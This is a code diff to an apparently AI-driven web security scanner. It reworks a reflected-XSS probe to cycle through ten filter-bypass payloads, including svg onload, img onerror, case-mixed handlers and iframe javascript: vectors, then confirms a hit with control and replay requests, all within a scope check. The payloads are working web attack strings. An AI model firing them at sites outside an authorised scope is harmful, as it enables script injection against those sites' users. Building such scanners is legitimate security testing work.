@@ -1090,12 +1090,11 @@ export function buildTools(s: PilotSession) {
     ),
     tool(
       "probe_xss",
-      "Confirm REFLECTED XSS: injects a unique marker into `param` and checks the HTML response reflects it UNESCAPED (the literal <tag> comes back, not &lt;tag&gt;). Sends a benign control (no tag) + a breakout payload twice. Returns negativeControl + positiveReplays evidenceIds + the effectMarker, ready for record_finding(category xss-reflected). Default = GET query-param reflection; pass a `body` containing {{XSS}} (and method/url) to test a body field. NOTE: confirms unescaped HTML reflection (high-signal first-order XSS); not proof of execution.",
+      "Confirm REFLECTED XSS, iterating a FILTER-BYPASS corpus (not a single fixed payload). Injects into `param` (or a `body` with {{XSS}}) and checks whether an active tag/handler survives UNESCAPED in the response. Tries ~10 ranked bypasses (direct tag, attribute breakout, case-mix, broken/slash-separated tags, svg/iframe/details/body vectors, onfocus/ontoggle/onerror handlers). CRUCIAL: if a benign marker reflects but the payloads are stripped/escaped, that is 'FILTER PRESENT — keep going', NOT clean. On a survivor it confirms with control + 2 replays and returns negativeControl + positiveReplays + the effectMarker + which bypass worked → record_finding(category xss-reflected). If nothing survives but input reflects, use probe_dom_xss (client-side sink).",
       { url: z.string(), param: z.string().optional(), method: z.string().optional(), body: z.string().optional() },
       async ({ url, param, method, body }) => {
         const tok = `xZ${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
-        const marker = `<xss${tok}>`; // 未エスケープで返れば HTML パース文脈に注入できている
-        const send = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
+        const buildReq = (val: string): HttpRequest | null => {
           let u = url;
           let b: string | null = null;
           if (body != null) b = body.replace(/\{\{XSS\}\}/g, val);
@@ -1108,48 +1107,92 @@ export function buildTools(s: PilotSession) {
               return null;
             }
           }
-          if (!isInScope(u, s.scope)) throw new Error(`out of scope: ${u}`);
-          const req: HttpRequest = { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url: u, headers: authHeaders(s), body: b };
+          if (!isInScope(u, s.scope)) return null;
+          return { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url: u, headers: authHeaders(s), body: b };
+        };
+        const rawSend = async (val: string): Promise<{ status: number; body: string; html: boolean } | null> => {
+          const req = buildReq(val);
+          if (!req) return null;
           const res = await s.http.send(req);
           bumpHttp(s, res.status);
-          const ev = s.evidence.record({
-            screenId: s.currentScreenId ?? "pilot",
-            validator: "claude-pilot-xss",
-            kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
-            response: res,
-            note: `xss ${tag} ${param ?? "body"}`,
-          });
-          return { evId: ev.id, status: res.status, raw: res.body.includes(marker), html: /html/i.test(res.headers["content-type"] ?? "") };
+          return { status: res.status, body: res.body, html: /html/i.test(res.headers["content-type"] ?? "") };
         };
-        let ctrl: Awaited<ReturnType<typeof send>>;
-        let p1: Awaited<ReturnType<typeof send>>;
-        let p2: Awaited<ReturnType<typeof send>>;
+        const recordSend = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
+          const req = buildReq(val)!;
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-xss", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `xss ${tag}` });
+          return { evId: ev.id, status: res.status, body: res.body };
+        };
+        // 各 payload の marker = 未エスケープで生き残った時だけ応答に現れる決定的な部分文字列(real <>/handler)。
+        const corpus = [
+          { name: "img-onerror", payload: `<img src=x onerror=alert('${tok}')>`, marker: `<img src=x onerror=alert('${tok}')>` },
+          { name: "attr-break-svg", payload: `"><svg onload=alert('${tok}')>`, marker: `<svg onload=alert('${tok}')>` },
+          { name: "case-mix", payload: `<ImG sRc=x OnErRoR=alert('${tok}')>`, marker: `OnErRoR=alert('${tok}')` },
+          { name: "svg-slash", payload: `<svg/onload=alert('${tok}')>`, marker: `<svg/onload=alert('${tok}')` },
+          { name: "details-toggle", payload: `<details open ontoggle=alert('${tok}')>`, marker: `<details open ontoggle=alert('${tok}')` },
+          { name: "body-onload", payload: `<body onload=alert('${tok}')>`, marker: `<body onload=alert('${tok}')` },
+          { name: "iframe-js", payload: `<iframe src=javascript:alert('${tok}')>`, marker: `<iframe src=javascript:alert('${tok}')` },
+          { name: "input-autofocus", payload: `"><input autofocus onfocus=alert('${tok}')>`, marker: `onfocus=alert('${tok}')` },
+          { name: "img-slash-sep", payload: `<img/src=x/onerror=alert('${tok}')>`, marker: `<img/src=x/onerror=alert('${tok}')` },
+          { name: "svg-comment", payload: `<svg onload=alert(1)//${tok}>`, marker: `<svg onload=alert(1)//${tok}` },
+        ];
+        const benignMarker = `xssbenign${tok}`;
+        let benign: Awaited<ReturnType<typeof rawSend>>;
         try {
-          ctrl = await send(`xss${tok}`, "negative_control", "control(benign, no tag)");
-          p1 = await send(`"><xss${tok}>`, "positive_replay", "payload #1");
-          p2 = await send(`"><xss${tok}>`, "positive_replay", "payload #2");
+          benign = await rawSend(benignMarker);
         } catch (e) {
           return txt(`ERROR: ${String(e).slice(0, 180)}`);
         }
-        if (!ctrl || !p1 || !p2) return txt("ERROR: could not build request (bad url/param — pass a valid url + param or a body with {{XSS}})");
+        if (!benign) return txt("ERROR: bad url/param — pass url+param or a body with {{XSS}}.");
+        const reflected = benign.body.includes(benignMarker);
+        // ── フィルタ回避コーパス反復 ── 生き残る payload を探す(1発ずつ)。
+        let winner: (typeof corpus)[number] | null = null;
+        let htmlCtx = false;
+        const tried: string[] = [];
+        for (const c of corpus) {
+          let r: Awaited<ReturnType<typeof rawSend>>;
+          try {
+            r = await rawSend(c.payload);
+          } catch {
+            continue;
+          }
+          if (!r) continue;
+          tried.push(c.name);
+          if (r.status < 500 && r.body.includes(c.marker)) {
+            winner = c;
+            htmlCtx = r.html;
+            break;
+          }
+        }
+        if (!winner)
+          return txt(
+            JSON.stringify({
+              reflected,
+              triedBypasses: tried.length,
+              verdict: reflected
+                ? `FILTER PRESENT (NOT clean): the input reflects but all ${tried.length} tag/handler bypasses were neutralized. Do NOT mark xss clean on this alone — run probe_dom_xss (client-side/DOM sink), and if the reflection lands in a specific context (JS string / attribute) craft a targeted payload via http_request.`
+                : `input not reflected in the response body — not a server-reflection XSS sink. For a client-rendered/SPA route use probe_dom_xss (browser execution).`,
+            }),
+          );
+        // ── 生存 payload を control + 2 replay で確証(marker-based) ──
+        const ctrl = await recordSend(benignMarker, "negative_control", "control(benign)");
+        const w1 = await recordSend(winner.payload, "positive_replay", `bypass ${winner.name} #1`);
+        const w2 = await recordSend(winner.payload, "positive_replay", `bypass ${winner.name} #2`);
         const verdict = checkLogicEvidence(
-          { status: ctrl.status, hasMarker: ctrl.raw },
-          [p1, p2].map((p) => ({ status: p.status, hasMarker: p.raw })),
+          { status: ctrl.status, hasMarker: ctrl.body.includes(winner.marker) },
+          [w1, w2].map((p) => ({ status: p.status, hasMarker: p.body.includes(winner!.marker) })),
         );
-        const htmlCtx = p1.html && p2.html;
         return txt(
           JSON.stringify({
             negativeControl: ctrl.evId,
-            positiveReplays: [p1.evId, p2.evId],
-            effectMarker: marker,
-            control: { reflectedUnescaped: ctrl.raw },
-            payload: [{ reflectedUnescaped: p1.raw, htmlResponse: p1.html }, { reflectedUnescaped: p2.raw, htmlResponse: p2.html }],
+            positiveReplays: [w1.evId, w2.evId],
+            effectMarker: winner.marker,
+            bypass: winner.name,
+            htmlResponse: htmlCtx,
             verdict: verdict.ok
-              ? htmlCtx
-                ? "REFLECTED XSS — payload reflected UNESCAPED in an HTML response; record_finding(xss-reflected) with these evidenceIds + effectMarker"
-                : "payload reflected unescaped but response is NOT html content-type — likely not browser-executable; verify the sink before recording"
-              : `not confirmed: ${(verdict as { reason: string }).reason}`,
+              ? `REFLECTED XSS CONFIRMED via the "${winner.name}" bypass — the payload reflected UNESCAPED. record_finding(category xss-reflected) with these evidenceIds + effectMarker.${htmlCtx ? "" : " (Response is not html content-type — confirm browser execution with probe_dom_xss before relying on it.)"}`
+              : `not confirmed on replay: ${(verdict as { reason: string }).reason}`,
           }),
         );
       },
